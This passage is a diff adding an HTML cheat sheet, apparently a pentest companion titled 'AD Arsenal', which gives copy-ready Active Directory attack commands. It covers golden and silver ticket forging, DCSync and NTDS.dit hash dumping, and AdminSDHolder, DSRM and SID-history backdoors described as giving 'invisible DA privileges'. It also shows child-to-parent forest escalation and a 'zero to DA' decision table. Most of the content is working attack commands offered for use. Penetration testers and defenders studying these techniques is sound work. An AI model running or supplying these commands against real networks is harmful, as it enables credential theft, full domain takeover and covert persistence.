+<span class="cmt"># Create golden ticket (Linux)</span>
+ticketer.py \
+  -nthash <span class="ph">KRBTGT_HASH</span> \
+  -domain-sid <span class="ph">S-1-5-21-xxx</span> \
+  -domain <span class="ph">domain.local</span> \
+  administrator
+
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass <span class="ph">DC_FQDN</span>
+
+<span class="cmt"># Rubeus (Windows)</span>
+Rubeus.exe golden \
+  /rc4:<span class="ph">KRBTGT_HASH</span> \
+  /domain:<span class="ph">domain.local</span> \
+  /sid:<span class="ph">DOMAIN_SID</span> \
+  /user:administrator /ptt</pre>
+      </div>
+
+      <div class="cd">Silver Ticket — service-specific, stealthier (no DC contact)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Requires: target machine account NTLM hash</span>
+ticketer.py \
+  -nthash <span class="ph">MACHINE_NTHASH</span> \
+  -domain-sid <span class="ph">DOMAIN_SID</span> \
+  -domain <span class="ph">domain.local</span> \
+  -spn cifs/<span class="ph">TARGET.domain.local</span> \
+  administrator
+
+<span class="cmt"># Access only that service — no DA TGT issued</span>
+export KRB5CCNAME=administrator.ccache
+smbclient.py -k -no-pass <span class="ph">TARGET.domain.local</span></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="dcsync" class="phase"><span class="phase-num">10</span>DCSync — Domain Hash Extraction</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">DCSync — All Methods</span><span class="tag tc">CRITICAL — requires DA or replication rights</span></div>
+    <div class="cb">
+      <div class="cd">Check who has replication rights (non-DAs that can DCSync)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Find non-default accounts with DCSync rights (BloodHound query)</span>
+MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) 
+  WHERE NOT u.name STARTS WITH "DOMAIN ADMINS"
+RETURN p</pre>
+      </div>
+
+      <div class="cd">secretsdump — main DCSync tool</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Full domain hash dump</span>
+secretsdump.py -hashes :<span class="ph">NTHASH</span> \
+  administrator@<span class="ph">DC_IP</span>
+
+<span class="cmt"># Just NTDS / no LSA</span>
+secretsdump.py -hashes :<span class="ph">NTHASH</span> \
+  administrator@<span class="ph">DC_IP</span> -just-dc-ntlm
+
+<span class="cmt"># Kerberos auth</span>
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass <span class="ph">DC_FQDN</span>
+
+<span class="cmt"># Specific user only</span>
+secretsdump.py -hashes :<span class="ph">NTHASH</span> \
+  administrator@<span class="ph">DC_IP</span> -just-dc-user krbtgt
+
+<span class="cmt"># From local NTDS.dit copy (offline)</span>
+secretsdump.py -ntds ntds.dit \
+  -system SYSTEM -hashes lmhash:nthash LOCAL</pre>
+      </div>
+
+      <div class="cd">Grant DCSync rights (if you have WriteDACL on domain object)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># PowerView — grant replication rights to attacker</span>
+Add-DomainObjectAcl \
+  -TargetIdentity "DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  -PrincipalIdentity <span class="ph">attacker</span> \
+  -Rights DCSync</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">NTDS.dit — Offline Extraction</span><span class="tag th">HIGH VALUE — when DCSync blocked</span></div>
+    <div class="cb">
+      <div class="cd">Extract NTDS.dit via Volume Shadow Copy (no DC reboot)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Method 1 — vssadmin + robocopy (DA required)</span>
+vssadmin create shadow /for=C:
+<span class="cmt"># Note the shadow copy path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span>
+
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit" C:\Temp\NTDS.dit
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
+
+<span class="cmt"># Method 2 — ntdsutil snapshot</span>
+ntdsutil "activate instance ntds" "ifm" \
+  "create full C:\Temp\IFM" quit quit
+
+<span class="cmt"># Method 3 — nxc module</span>
+nxc smb <span class="ph">DC_IP</span> -u administrator -H <span class="ph">NTHASH</span> \
+  --ntds vss
+
+<span class="cmt"># Offline crack with secretsdump</span>
+secretsdump.py -ntds C:\Temp\NTDS.dit \
+  -system C:\Temp\SYSTEM LOCAL \
+  -outputfile domain_hashes</pre>
+      </div>
+
+      <div class="tip"><strong>HASHCAT AFTER:</strong> Sort hashes by frequency — common passwords shared across accounts suggest default / GPO-deployed passwords. <code>sort -t: -k4 domain_hashes.ntds | uniq -D -f3</code></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="persistence" class="phase"><span class="phase-num">11</span>Domain Persistence</div>
+
+<div class="g3">
+
+  <div class="card">
+    <div class="ch"><span class="ct">AdminSDHolder Backdoor</span><span class="tag tp">PERSISTENCE</span></div>
+    <div class="cb">
+      <div class="cd">Permissions on AdminSDHolder propagate to all protected groups every 60 min</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Add GenericAll on AdminSDHolder</span>
+<span class="cmt"># → propagates to DA, EA, Schema Admins etc.</span>
+Add-DomainObjectAcl \
+  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=<span class="ph">domain</span>,DC=<span class="ph">local</span>" \
+  -PrincipalIdentity <span class="ph">backdoor_user</span> \
+  -Rights All
+
+<span class="cmt"># Force immediate propagation (normally 60 min)</span>
+Invoke-ADSDPropagation</pre>
+      </div>
+
+      <div class="tip"><strong>EFFECT:</strong> backdoor_user gains GenericAll on every AdminSDHolder-protected group. Even if removed from DA, they retain ACL rights and can re-add themselves.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">DSRM Account — Local DC Admin</span><span class="tag tp">PERSISTENCE</span></div>
+    <div class="cb">
+      <div class="cd">Enable DSRM account for local DC login (network logon)</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Get DSRM hash (run on DC as SYSTEM/DA)</span>
+<span class="cmt"># Mimikatz</span>
+lsadump::lsa /patch /name:dsrm
+
+<span class="cmt"># Enable network logon for DSRM account</span>
+<span class="cmt"># Registry key (requires DA)</span>
+Set-ItemProperty -Path \
+  "HKLM:\System\CurrentControlSet\Control\Lsa" \
+  -Name DsrmAdminLogonBehavior -Value 2
+
+<span class="cmt"># PTH with DSRM hash — local-auth flag</span>
+secretsdump.py -hashes :<span class="ph">DSRM_HASH</span> \
+  -local-auth administrator@<span class="ph">DC_IP</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">SID History Injection</span><span class="tag tp">PERSISTENCE</span></div>
+    <div class="cb">
+      <div class="cd">Inject DA SID into a regular user's SIDHistory attribute</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Requires NTDS manipulation — Mimikatz</span>
+<span class="cmt"># Get Domain SID</span>
+Get-DomainSID
+
+<span class="cmt"># Mimikatz — inject SID history</span>
+privilege::debug
+sid::patch
+sid::add /sam:<span class="ph">backdoor_user</span> /new:<span class="ph">DOMAIN_SID</span>-500
+
+<span class="cmt"># Verify</span>
+Get-DomainUser <span class="ph">backdoor_user</span> | Select-Object sidhistory
+
+<span class="cmt"># User now has invisible DA privileges</span>
+<span class="cmt"># Appears as low-priv user — SIDHistory grants DA access</span></pre>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ══════════════════════════════════════════════════════ -->
+<div id="cross-trust" class="phase"><span class="phase-num">12</span>Cross-Trust Attacks</div>
+
+<div class="g2">
+
+  <div class="card">
+    <div class="ch"><span class="ct">Trust Enumeration + SID Filtering</span><span class="tag tm">RECON FIRST</span></div>
+    <div class="cb">
+      <div class="cd">Map all trusts before attempting cross-domain attacks</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># PowerView — enumerate all trusts</span>
+Get-DomainTrust
+Get-DomainTrust -Domain <span class="ph">child.domain.local</span>
+Get-ForestTrust
+
+<span class="cmt"># impacket</span>
+GetADUsers.py -all -dc-ip <span class="ph">DC_IP</span> \
+  '<span class="ph">domain.local</span>/<span class="ph">user</span>:<span class="ph">pass</span>'
+
+<span class="cmt"># BloodHound</span>
+Get-DomainTrustMapping  <span class="cmt"># shows all trust paths</span>
+
+<span class="cmt"># Check SID Filtering status</span>
+<span class="cmt"># Quarantine attribute = SID filtering enabled (blocks SID history)</span>
+(Get-DomainTrust).TrustAttributes</pre>
+      </div>
+
+      <div class="tip"><strong>KEY FLAGS:</strong> WITHIN_FOREST = internal trust (SID filtering usually off). FOREST_TRANSITIVE = cross-forest (SID filtering usually on). TREAT_AS_EXTERNAL = quarantine on (SID history attacks blocked).</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="ch"><span class="ct">Child → Parent Domain Escalation</span><span class="tag tc">CRITICAL — ExtraSids attack</span></div>
+    <div class="cb">
+      <div class="cd">Abuse trust relationship with SIDHistory to escalate to parent/forest root</div>
+      <div class="code-block"><button class="copy-btn" onclick="cp(this)">COPY</button>
+        <pre><span class="cmt"># Prerequisite: DA in child domain, know child KRBTGT hash</span>
+<span class="cmt"># Get child domain KRBTGT hash (DCSync from child DC)</span>
+secretsdump.py -hashes :<span class="ph">CHILD_DA_HASH</span> \
+  administrator@<span class="ph">CHILD_DC_IP</span> -just-dc-user krbtgt
+
+<span class="cmt"># Get Enterprise Admin SID of parent domain</span>
+Get-DomainGroup -Domain <span class="ph">parent.local</span> \
+  -Identity "Enterprise Admins" | Select-Object objectsid
+
+<span class="cmt"># Forge inter-realm TGT with Enterprise Admin SID in ExtraSids</span>
+ticketer.py \
+  -nthash <span class="ph">CHILD_KRBTGT_HASH</span> \
+  -domain-sid <span class="ph">CHILD_DOMAIN_SID</span> \
+  -domain <span class="ph">child.domain.local</span> \
+  -extra-sid <span class="ph">PARENT_EA_SID</span> \
+  administrator
+
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass <span class="ph">PARENT_DC_FQDN</span></pre>
+      </div>
+
+      <div class="gotcha"><strong>GOTCHA:</strong> SID Filtering blocks ExtraSids across external trusts. Works reliably on parent-child trusts within same forest (SID filtering typically disabled). Always check <code>TrustAttributes</code> for TREAT_AS_EXTERNAL flag before attempting.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- QUICK REFERENCE MASTER TABLE -->
+<div class="phase" style="margin-top:40px"><span class="phase-num">⊕</span>Master Decision Table — AD Attack Chain</div>
+
+<div class="g2">
+
+  <div class="card s2">
+    <div class="ch"><span class="ct">AD Attack Prioritization — From Zero to DA</span><span class="tag tm">WORKFLOW REFERENCE</span></div>
+    <div class="cb">
+      <table class="ft">
+        <tr>
+          <th class="sn">#</th>
+          <th>Situation</th>
+          <th>First Move</th>
+          <th>Escalation Path</th>
+          <th>Key Tool</th>
+        </tr>
+        <tr>
+          <td class="sn">1</td>
+          <td>No creds, domain joined host visible</td>
+          <td>LDAP anon + SMB null session + RPC → user list</td>
+          <td>Kerbrute userenum → AS-REP roast → spray</td>
+          <td>enum4linux-ng, kerbrute</td>
+        </tr>
+        <tr>
+          <td class="sn">2</td>
+          <td>Have domain creds (low-priv user)</td>
+          <td>BloodHound ALL collection → find shortest path to DA</td>
+          <td>Kerberoast → crack → check ACL edges</td>
+          <td>bloodhound-python, GetUserSPNs.py</td>
+        </tr>
+        <tr>
+          <td class="sn">3</td>
+          <td>GenericWrite on user in BloodHound</td>
+          <td>Shadow Credentials (certipy shadow auto)</td>
+          <td>PKINIT → NT hash → PTH → further ACLs</td>
+          <td>certipy-ad shadow, pywhisker</td>
+        </tr>
+        <tr>
+          <td class="sn">4</td>
+          <td>GenericAll on group → privileged group</td>
+          <td>Add-DomainGroupMember (add self to group)</td>
+          <td>New session → net use → group rights apply</td>
+          <td>PowerView, net group /domain</td>
+        </tr>
+        <tr>
+          <td class="sn">5</td>
+          <td>GenericWrite on computer</td>
+          <td>RBCD — create machine acct, write msDS-AllowedToActOnBehalfOf</td>
+          <td>S4U2Self+Proxy → admin ST → secretsdump</td>
+          <td>addcomputer.py, rbcd.py, getST.py</td>
+        </tr>
+        <tr>
+          <td class="sn">6</td>
+          <td>ADCS deployed — certipy finds ESC1/ESC6</td>
+          <td>Request cert with SAN=administrator</td>
+          <td>Certipy auth → NT hash → PTH to DC</td>
+          <td>certipy-ad req, certipy-ad auth</td>
+        </tr>
+        <tr>
+          <td class="sn">7</td>
+          <td>SMB signing off + coercion possible</td>
+          <td>Responder (SMB=Off) + ntlmrelayx → relay targets</td>
+          <td>SAM dump or LDAP → machine account → RBCD</td>
+          <td>ntlmrelayx.py, responder, coercer</td>
+        </tr>
+        <tr>
+          <td class="sn">8</td>
+          <td>Unconstrained delegation host found</td>
+          <td>Rubeus monitor + coerce DC auth (PrinterBug/PetitPotam)</td>
+          <td>Capture DC TGT → PTT → DCSync</td>
+          <td>Rubeus, printerbug.py, secretsdump.py</td>
+        </tr>
+        <tr>
+          <td class="sn">9</td>
+          <td>Have DA — want persistence</td>
+          <td>DCSync KRBTGT → Golden Ticket</td>
+          <td>AdminSDHolder backdoor, SID History, DSRM</td>
+          <td>secretsdump.py, ticketer.py</td>
+        </tr>
+        <tr>
+          <td class="sn">10</td>
+          <td>Child domain DA → want forest root</td>
+          <td>DCSync child KRBTGT → ExtraSids with EA SID</td>
+          <td>Inter-realm ticket → parent DC → full forest</td>
+          <td>ticketer.py with -extra-sid</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <div>@ethicalsoup &middot; AD Arsenal &middot; Companion to Pentest Field Guide</div>
+  <div>Living document — updated as new techniques discovered</div>
+</footer>
+
+</div>
+
+<script>
+function cp(btn) {
+  const pre = btn.nextElementSibling;
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = 'COPIED';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('.nav a');
+window.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => { if (window.scrollY >= s.offsetTop - 100) current = s.id; });
+  navLinks.forEach(a => {
+    a.classList.toggle('active', a.getAttribute('href') === '#' + current);
+  });
+});
+</script>
+</body>
+</html>
